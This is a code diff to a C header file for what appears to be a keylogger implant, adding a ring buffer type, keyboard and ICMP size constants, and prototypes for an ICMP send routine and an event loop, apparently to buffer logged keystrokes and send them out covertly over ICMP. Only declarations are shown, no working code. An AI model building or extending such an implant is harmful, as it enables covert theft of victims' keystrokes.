@@ -15,6 +15,10 @@
 
 #define QUEUE_BUFFER_SIZE 1024
 #define STRING_BUFFER_SIZE 256
+#define MAX_KEYBOARDS 16
+#define ICMP_DATA_SIZE 56
+#define RINGBUF_SIZE 512
+#define RINGBUF_FLUSH_THRESHOLD (RINGBUF_SIZE - 64)
 
 /* will be overriden at compile-time if prod-mode enabled */
 #define BLOCK_SIZE 64
@@ -24,6 +28,13 @@
 #define BLOCK ("")
 #define KEY ("")
 #define IV ("")
+
+typedef struct ringbuf_s {
+    uint8_t data[RINGBUF_SIZE];
+    size_t head;
+    size_t tail;
+    size_t count;
+} ringbuf_t;
 
 /*
     represents whatever data is currently logged for a single keyboard
@@ -98,5 +109,17 @@ void array_free(int8_t **);
 int8_t **array_from_string(const int8_t *, int8_t);
 int8_t ascii_to_hex(char input[STRING_BUFFER_SIZE / 2], char output[STRING_BUFFER_SIZE]);
 int8_t hex_to_ascii(char input[STRING_BUFFER_SIZE], char output[STRING_BUFFER_SIZE]);
+
+// ringbuf.c
+void ringbuf_init(ringbuf_t *rb);
+uint8_t ringbuf_push(ringbuf_t *rb, uint8_t byte);
+size_t ringbuf_read(ringbuf_t *rb, uint8_t *dst, size_t len);
+int ringbuf_should_flush(ringbuf_t *rb);
+
+// icmp.c
+uint8_t icmp_send(const int8_t *dst_ip, const uint8_t *payload, size_t len);
+
+// evloop.c
+uint8_t evloop_run(implant_t *instance);
 
 #endif /* IMPLANT_H */
